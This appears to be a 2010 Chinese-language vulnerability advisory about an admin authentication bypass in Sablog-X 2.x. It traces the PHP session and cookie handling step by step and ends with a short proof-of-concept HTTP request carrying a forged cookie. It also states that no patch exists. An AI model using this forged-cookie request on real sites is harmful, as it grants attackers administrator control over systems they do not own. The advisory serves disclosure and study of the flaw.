---
title: Sablog-X 2.X 后台管理权限欺骗漏洞
description: 一post/Sablog-X-2.X-houtaiguanliquanxianqipianloudong.html">Sablog-X2.X后台管理权限欺骗漏洞描叙：由于post/Sablog-X-2.X-houtaiguanliquanxianqipianloudong.html">Sablog-xv2.x的后台认证过程存在严重的逻辑问题，导致构造特殊的cookie直接登录后台。二分析：……
date: 2010-02-25 10:49:18
category: 漏洞信息
tags: ['Sablog', '漏洞信息', 'PoC']
post_id: 1078
alias: Sablog-X-2.X-houtaiguanliquanxianqipianloudong
ViewNums: 2816
---

一 [Sablog-X 2.X 后台管理权限欺骗漏洞](/blog/sablog-x-2x-houtaiguanliquanxianqipianloudong)描叙：

由于[Sablog-x v2.x](/blog/sablog-x-2x-houtaiguanliquanxianqipianloudong)的后台认证过程存在严重的逻辑问题，导致构造特殊的cookie直接登录后台。

二 分析 ：

// cp.php

if (!$sax_uid || !$sax_pw || !$sax_logincount || !$sax_hash) {
// 只要这个条件不满足,就可以通过后台的权限验证了
 loginpage();
}
...
if ($sax_group == 1) {
// 如果要获得管理员权限,还必须保证$sax_group的值为1
...

下面来看下这几个变量是怎么来的

// common.inc.php

list($sax_uid, $sax_pw, $sax_logincount) = $_COOKIE['sax_auth'] ? explode(" ", authcode($_COOKIE['sax_auth'], 'DECODE')) : array('', '', '');
// authcode()就是简单的调用base64_decode
$sax_hash = sax_addslashes($_COOKIE['sax_hash']);
// 这些变量来自$_COOKIE,是可以控制的:)
// 不过后面的代码在一定条件下会通过extract($_EVO)来重新注册这些变量

$sax_uid = intval($sax_uid);
$sax_pw = sax_addslashes($sax_pw);
$sax_logincount = intval($sax_logincount);
$sax_group = 4;
// 默认的值为4,而我们需要的值是1
$_EVO = array();
// 这里是fix那个变量覆盖的漏洞:)

$seccode = $sessionexists = 0;
$userfields = 'u.userid AS sax_uid, u.username AS sax_user, u.password AS sax_pw, u.groupid AS sax_group, u.logincount AS sax_logincount, u.email as sax_email, u.url as sax_url, u.lastpost, u.lastip, u.lastvisit, u.lastactivity';
// 这里定义的字段包括sax_user、sax_pw、sax_group、sax_logincount,这些都是后台权限验证时要用到的
if ($sax_hash) {
 if ($sax_uid && $sax_pw) {
// 流程[1]
// 这里会查询sax_group,但如果我们想让查询出的值为1[也就是说查询出管理员的信息],就必须知道管理员的sax_hash、sax_pw、sax_logincount等多个值
  $query = $DB->query("SELECT s.hash, s.seccode, $userfields
   FROM {$db_prefix}users u
   LEFT JOIN {$db_prefix}sessions s ON (s.uid = u.userid)
   WHERE s.hash='$sax_hash' AND u.userid='$sax_uid' AND CONCAT_WS('.',s.ip1,s.ip2,s.ip3,s.ip4)='$onlineip'
   AND u.password='$sax_pw' AND u.logincount='$sax_logincount' AND s.auth_key='$sax_auth_key'");
 } else {
  $query = $DB->query("SELECT hash,uid as sessionuid,groupid,seccode,lastactivity FROM {$db_prefix}sessions WHERE hash='$sax_hash' AND CONCAT_WS('.',ip1,ip2,ip3,ip4)='$onlineip' LIMIT 1");
// 流程[2]
// 如果我们知道管理员的sax_hash和onlineip,就可以使下面的$_EVO['sessionuid']的值为管理员的id
 }
 if ($_EVO = $DB->fetch_array($query)){
  $sessionexists = 1;
  if($_EVO['sessionuid']) {
// 流程[3]
   $query = $DB->query("SELECT $userfields FROM {$db_prefix}users u WHERE u.userid='".intval($_EVO['sessionuid'])."'");
   $_EVO = array_merge($_EVO, $DB->fetch_array($query));
// 这里查询的数据会合并到$_EVO,而我们只要能控制$_EVO['sessionuid']的值为1[假设我们要查询的管理员id为1],就可以查询出正确的管理员信息,这样就可以保证sax_group的值为1了
   $sax_uid = $_EVO['userid'];
  }
 } else {
  if($_EVO = $DB->fetch_one_array("SELECT hash,groupid,seccode,lastactivity FROM {$db_prefix}sessions WHERE hash='$sax_hash' AND CONCAT_WS('.',ip1,ip2,ip3,ip4)='$onlineip'")) {
   dcookies();
   $sessionexists = 1;
  }
 }
}
......
@extract($_EVO);

由上面的代码可以看到,如果我们知道session表中uid为1的数据的sax_hash和onlineip,通过流程[2][3]就可以查询出正确的管理员信息,再通过extract($_EVO)注册变量,就可以通过后台的验证,获得管理员权限了:)
那么我们如何知道正确的sax_hash和onlineip呢？

// global.func.php

function updatesession() {
...
  replacesession(1);
...
}

function replacesession($insert = 0) {
...
$ips = explode('.', $onlineip);
...
  $DB->query("INSERT INTO {$db_prefix}sessions (hash, auth_key, ip1, ip2, ip3, ip4, uid, groupid, lastactivity, seccode, is_robot) VALUES ('$sax_hash', '$sax_auth_key', '$ips[0]', '$ips[1]', '$ips[2]', '$ips[3]', '$sax_uid', '$sax_group', '$timestamp', '$seccode', '".IS_ROBOT."')");
...

replacesession()函数为我们提供帮助,因为$sax_hash、$sax_uid、$onlineip这些变量是可以控制的,所以我们可以向session表中出入一条uid为1的数据:)

首先我们使$sax_uid为1,$sax_pw为空,这样就会跳过流程[1]执行流程[2],这时我们的sax_hash和onlineip在session表中并不存在,所以流程[3]不会执行,通过extract($_EVO)注册变量时也不会重新注册$sax_uid、$sax_hash和$onlineip,这样我们就可以通过updatesession()函数向session表中插入一条uid为1同时sax_hash和onlineip也是我们知道的数据了
然后我们重新执行上面的过程,因为这时session表里已经有了我们需要的数据了,流程[3]将被执行,user表中uid为1的管理员数据将被查询出并合并到$_EVO,并通过extract()重新注册变量[$sax_group的值将被重新注册为1],这样我们就可以通过后台权限验证,并获得管理员权限了:)

三 [Sablog-X 2.X 后台管理权限欺骗漏洞利用代码](/blog/sablog-x-2x-houtaiguanliquanxianqipianloudong) :

PoC:

GET /cp.php  HTTP/1.1;
Host: 127.0.0.1
Connection: Close
Cookie: sax_auth=MQkJ;sax_hash=abcdef;

四 [Sablog-X 2.X 后台管理权限欺骗漏洞补丁](/blog/sablog-x-2x-houtaiguanliquanxianqipianloudong)[fix]：

缺

by Ryat[puretot]
mail: puretot at gmail dot com
team: [http://www.80vul.com](http://www.80vul.com/)
data: 2010/2/24

